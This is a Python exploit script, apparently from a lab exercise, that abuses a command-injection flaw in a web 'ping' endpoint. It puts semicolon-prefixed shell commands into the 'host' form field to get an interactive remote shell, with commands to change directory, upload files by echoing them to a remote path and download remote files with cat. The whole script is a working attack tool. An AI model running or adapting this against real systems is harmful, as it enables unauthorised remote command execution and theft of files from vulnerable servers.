import requests

url = 'http://ubuntu:4400/ping'
path = '/'

def execute_remotely(command):
    prepered_command = ';cd %s; %s' % (path, command)
    d = {'host': prepered_command}
    res = requests.post(url, data=d)
    return res.json()['output'][:-1]


def cd(command):
    d = {'host': ';'+command+'; pwd'}
    res = requests.post(url, data=d)
    return res.json()['output'].replace('\n', '')

def upload(source, destination):
    output_command = 'echo \"'
    with open(source, 'r') as source_file:
        for l in source_file.readlines():
            output_command+=l
        
    output_command = output_command
    output_command+='\" > '+destination
    execute_remotely(output_command)

def download(source, destination):
    file_content = execute_remotely('cat '+source)
    with open(destination, 'w') as file:
        file.write(file_content)


path = cd('cd ./')


while 1:
    print('RCE@ubuntu '+path+' > ', end='')
    command = input()
    if command == 'exit':
        break
    if command.split(' ')[0] == 'cd':
        path = cd(command)
    elif command.split(' ')[0] == 'upload':
        source_file = command.split(' ')[1]
        destination_file = command.split(' ')[2]
        upload(source_file, destination_file)
    elif command.split(' ')[0] == 'download':
        source_file = command.split(' ')[1]
        destination_file = command.split(' ')[2]
        download(source_file, destination_file)
    else:
        output = execute_remotely(command)
        print(output)

